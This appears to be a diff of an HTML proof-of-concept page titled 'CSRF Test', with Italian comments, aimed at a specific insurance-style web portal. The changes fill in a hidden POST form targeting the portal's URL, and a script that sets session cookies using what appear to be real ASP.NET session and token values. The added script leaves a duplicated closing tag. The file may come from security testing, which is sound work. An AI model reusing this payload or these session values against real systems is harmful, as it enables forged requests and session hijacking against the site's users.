@@ -8,7 +8,7 @@
 <body>
     <h1>CSRF Test</h1>
     <!-- Il form invia una richiesta POST all'URL specificato -->
-    <form action="https://" method="POST">
+    <form action="https://test001-portal.vittoriarms.eu/PortalWeb//" method="POST">
         <!-- Input hidden per i dati della richiesta -->
         <input type="hidden" name="OperationType" value="1">
         <input type="hidden" name="Role" value="null">
@@ -26,7 +26,10 @@
     <!-- Script per impostare i cookie di sessione -->
     <script>
         // Imposta i cookie di sessione (esempio)
-        
+        document.cookie = "ASP.NET_SessionId=hdgmkc1vlzeb1zwfuzmilruw; path=/";
+        document.cookie = "cookiebar=CookieAllowed; path=/";
+        document.cookie = "SO=jvVcSTCe/P/h6PBUCm59OA==%Oc+bp0quyJ2R4mWe/Skt+jV5jebegWB13+SqUbShJc51Km+UHGKWSh3tMYIr5JxUtofnN/8vyxlP/jlsgm0bFaDoI+eb/LR6J0csDp3IdibG2Ad6nnhmRs77TQgk2KEk1e7Sx32NEKJlsZ3RaoCTsNdlmUJxDUhSPMJ6ATLN2dcfG/jgK6w8BhfRavAmg/t1; path=/";
+    </script>
     </script>
 </body>
 </html>
